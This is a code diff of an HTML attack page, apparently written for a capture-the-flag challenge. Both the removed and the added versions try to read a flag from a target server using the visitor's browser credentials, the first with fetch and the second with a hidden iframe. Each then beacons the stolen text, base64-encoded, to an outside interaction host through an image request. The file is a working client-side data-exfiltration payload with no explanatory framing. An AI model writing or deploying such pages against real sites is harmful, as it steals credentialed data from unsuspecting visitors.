@@ -1,15 +1,18 @@
 <!DOCTYPE html>
 <html>
 <body>
+<iframe id="steal" style="display:none;"></iframe>
 <script>
-fetch('http://34.134.162.213:17001/get_flag', { credentials: 'include' })
-  .then(res => res.text())
-  .then(flag => {
-    new Image().src = 'https://toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site/?flag=' + btoa(flag);
-  })
-  .catch(err => {
-    new Image().src = 'https://toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site/?err=' + btoa(err);
-  });
+  const iframe = document.getElementById('steal');
+  iframe.src = 'http://34.134.162.213:17001/get_flag';
+  iframe.onload = function() {
+    try {
+      const flag = iframe.contentDocument.body.innerText;
+      new Image().src = 'https://toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site/?flag=' + btoa(flag);
+    } catch(e) {
+      new Image().src = 'https://toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site/?err=' + btoa(e.toString());
+    }
+  };
 </script>
 </body>
 </html>
